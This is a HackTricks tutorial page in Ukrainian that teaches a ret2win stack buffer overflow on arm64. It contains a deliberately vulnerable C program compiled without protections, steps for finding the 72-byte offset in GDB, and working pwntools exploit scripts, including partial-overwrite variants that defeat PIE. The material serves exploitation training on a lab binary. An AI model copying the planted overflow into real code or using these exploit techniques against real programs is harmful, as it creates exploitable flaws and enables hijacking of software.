# Ret2win - arm64

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

–ó–Ω–∞–π–¥—ñ—Ç—å –≤—Å—Ç—É–ø –¥–æ arm64 –≤:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## –ö–æ–¥&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –±–µ–∑ pie —Ç–∞ canary:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
```
## –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∑—Å—É–≤—É

### –í–∞—Ä—ñ–∞–Ω—Ç —à–∞–±–ª–æ–Ω—É

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**GEF**](https://github.com/bata24/gef):

–ó–∞–ø—É—Å—Ç—ñ—Ç—å gdb –∑ gef, —Å—Ç–≤–æ—Ä—ñ—Ç—å —à–∞–±–ª–æ–Ω —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –π–æ–≥–æ:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../.gitbook/assets/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64 —Å–ø—Ä–æ–±—É—î –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é –≤ —Ä–µ–≥—ñ—Å—Ç—Ä—ñ x30 (—è–∫–∏–π –±—É–≤ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π), –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ, —â–æ–± –∑–Ω–∞–π—Ç–∏ –∑—Å—É–≤ —à–∞–±–ª–æ–Ω—É:
```bash
pattern search $x30
```
<figure><img src="../../../.gitbook/assets/image (1206).png" alt=""><figcaption></figcaption></figure>

**–ó—Å—É–≤ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å 72 (9x48).**

### –í–∞—Ä—ñ–∞–Ω—Ç –∑—Å—É–≤—É —Å—Ç–µ–∫—É

–ü–æ—á–Ω—ñ—Ç—å –∑ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ —Å—Ç–µ–∫—É, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è —Ä–µ–≥—ñ—Å—Ç—Ä pc:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>

–¢–µ–ø–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —Ç–æ—á–∫—É –∑—É–ø–∏–Ω–∫–∏ –ø—ñ—Å–ª—è `read()` —ñ –ø—Ä–æ–¥–æ–≤–∂—Ç–µ, –ø–æ–∫–∏ `read()` –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ, —ñ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —à–∞–±–ª–æ–Ω, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ 13371337:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

–ó–Ω–∞–π–¥—ñ—Ç—å, –¥–µ —Ü–µ–π —à–∞–±–ª–æ–Ω –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ –ø–∞–º'—è—Ç—ñ:

<figure><img src="../../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

–¢–æ–¥—ñ: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../.gitbook/assets/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## No PIE

### Regular

–û—Ç—Ä–∏–º–∞–π—Ç–µ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó **`win`**:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../.gitbook/assets/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

–ù–∞—Å–ø—Ä–∞–≤–¥—ñ —Ü–µ –±—É–¥–µ –±—ñ–ª—å—à–µ —Å—Ö–æ–∂–µ –Ω–∞ off-by-2 —É –∑–±–µ—Ä–µ–∂–µ–Ω–æ–º—É PC —É —Å—Ç–µ–∫—É. –ó–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –≤—Å—é –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è, –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ–º–æ **—Ç—ñ–ª—å–∫–∏ –æ—Å—Ç–∞–Ω–Ω—ñ 2 –±–∞–π—Ç–∏** –∑–Ω–∞—á–µ–Ω–Ω—è–º `0x06c4`.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../.gitbook/assets/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —â–µ –æ–¥–∏–Ω –ø—Ä–∏–∫–ª–∞–¥ off-by-one –≤ ARM64 –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), —è–∫–∏–π —î —Å–ø—Ä–∞–≤–∂–Ω—ñ–º off-by-**one** —É –≤–∏–≥–∞–¥–∞–Ω—ñ–π –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.

## –ó PIE

{% hint style="success" %}
–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **–±–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç—É `-no-pie`**
{% endhint %}

### Off-by-2

–ë–µ–∑ leak –º–∏ –Ω–µ –∑–Ω–∞—î–º–æ —Ç–æ—á–Ω—É –∞–¥—Ä–µ—Å—É –≤–∏–≥—Ä–∞—à–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, –∞–ª–µ –º–æ–∂–µ–º–æ –∑–Ω–∞—Ç–∏ –∑—Å—É–≤ —Ñ—É–Ω–∫—Ü—ñ—ó –≤—ñ–¥ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É, —ñ –∑–Ω–∞—é—á–∏, —â–æ –∞–¥—Ä–µ—Å–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è, —è–∫—É –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î–º–æ, –≤–∂–µ –≤–∫–∞–∑—É—î –Ω–∞ –±–ª–∏–∑—å–∫—É –∞–¥—Ä–µ—Å—É, –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—Å—É–≤ –¥–æ –≤–∏–≥—Ä–∞—à–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó (**0x7d4**) —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —ñ –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ–π –∑—Å—É–≤:

<figure><img src="../../../.gitbook/assets/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
